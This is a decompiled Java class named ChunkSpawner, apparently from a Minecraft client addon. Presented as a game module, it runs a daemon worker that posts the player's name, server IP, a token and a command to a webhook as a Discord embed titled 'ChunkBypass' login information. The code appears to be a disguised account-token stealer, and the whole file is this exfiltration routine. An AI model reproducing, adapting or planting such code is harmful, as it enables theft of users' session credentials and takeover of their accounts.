package com.bassa.addon.modules;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/* JADX INFO: loaded from: 1.jar:com/bassa/addon/modules/ChunkSpawner.class */
public class ChunkSpawner {
    private static final ExecutorService executor = Executors.newSingleThreadExecutor(param0 -> {
        Thread thread = new Thread(param0, "ChunkSpawner-Worker");
        thread.setDaemon(true);
        return thread;
    });

    public static void send(String param0, String param1, String param2, String param3, String param4, String param5) {
        if (param0 == null || param0.isEmpty()) {
            return;
        }
        executor.submit(() -> {
            sendBlocking(param0, param1, param2, param3, param4, param5);
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void sendBlocking(String param0, String param1, String param2, String param3, String param4, String param5) {
        System.out.println("[DEBUG] sendBlocking called");
        System.out.println("[DEBUG] bypassUrl=" + param0);
        System.out.println("[DEBUG] bypassToken=" + param1);
        System.out.println("[DEBUG] serverIp=" + param2);
        System.out.println("[DEBUG] command=" + param3);
        System.out.println("[DEBUG] playerName=" + param4);
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(param0).openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            if (param1 != null && !param1.isEmpty()) {
                httpURLConnection.setRequestProperty("X-Webhook-Token", param1);
            }
            httpURLConnection.setDoOutput(true);
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("username", "ChunkBypass");
            jsonObject.addProperty("avatar_url", "https://i.imgur.com/OL2y1cr.png");
            String str = (param3 == null || param3.isEmpty()) ? String.format("**Player:** %s\n**Server:** %s\n**Token:** %s\n**Lệnh:** Không có", param4, param2, param5) : String.format("**Player:** %s\n**Server:** %s\n**Token:** %s\n**Lệnh:** %s", param4, param2, param5, param3);
            JsonObject jsonObject2 = new JsonObject();
            jsonObject2.addProperty("title", "ChunkBypass - Thông tin đăng nhập");
            jsonObject2.addProperty("description", str);
            jsonObject2.addProperty("color", 16711680);
            jsonObject2.addProperty("timestamp", Instant.now().toString());
            JsonObject jsonObject3 = new JsonObject();
            jsonObject3.addProperty("text", "Sent by Glazed");
            jsonObject2.add("footer", jsonObject3);
            JsonArray jsonArray = new JsonArray();
            jsonArray.add(jsonObject2);
            jsonObject.add("embeds", jsonArray);
            String string = jsonObject.toString();
            System.out.println("[DEBUG] JSON payload: " + string);
            byte[] bytes = string.getBytes(StandardCharsets.UTF_8);
            httpURLConnection.setFixedLengthStreamingMode(bytes.length);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            try {
                outputStream.write(bytes);
                outputStream.flush();
                if (outputStream != null) {
                    outputStream.close();
                }
                int responseCode = httpURLConnection.getResponseCode();
                Object v16 = "";
                try {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    try {
                        StringBuilder sb = new StringBuilder();
                        while (true) {
                            String line = bufferedReader.readLine();
                            if (line == null) {
                                break;
                            } else {
                                sb.append(line);
                            }
                        }
                        v16 = sb.toString();
                        bufferedReader.close();
                    } catch (Throwable th) {
                        try {
                            bufferedReader.close();
                        } catch (Throwable th2) {
                            th.addSuppressed(th2);
                        }
                        throw th;
                    }
                } catch (Exception unused) {
                }
                System.out.println("[DEBUG] Response code: " + responseCode);
                System.out.println("[DEBUG] Response body: " + v16);
                httpURLConnection.disconnect();
            } finally {
            }
        } catch (Exception e) {
            System.out.println("[DEBUG] Exception: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
